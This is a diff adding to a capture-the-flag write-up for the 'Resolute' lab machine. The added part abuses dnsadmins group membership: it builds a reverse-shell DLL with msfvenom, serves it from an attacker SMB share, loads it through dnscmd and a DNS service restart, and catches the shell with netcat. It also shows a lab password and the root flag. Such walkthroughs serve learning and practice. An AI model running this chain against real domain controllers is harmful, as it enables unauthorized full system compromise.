@@ -35,3 +35,29 @@ this listed all the folders in the directory and we decided to checkout the ```P
 find a file called ```PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt``` her we find the password for the 
 user ryan : ```Serv3r4Admin4cc123!```
 
+We login as ryan and use the command ```whoami \all``` to see that we are part of the dnsadmins group.
+with that knowledge we do dll injection and create a payload with msfvenom and use smbserver.py:
+```
+msfvenom -p windows/shell/reverse_tcp LHOST=10.10.16.11 LPORT=1234-f dll -o resol.dll
+./smbserver.py SHARE ./
+```
+As ryan we then share the file and open up a listener:
+```
+dnscmd RESOLUTE /config /serverlevelplugindll \\10.10.16.11\SHARE\resol.dll
+sc.exe stop dns
+sc.exe start dns
+```
+```nc -nlvp 1234```
+
+We successfully login as Administrator and find the root flag.
+
+root flag: ```feb02414afa5a93579d64d3f5c9c561a```
+
+System has been rooted; action is no longer required.
+
+
+
+
+
+
+
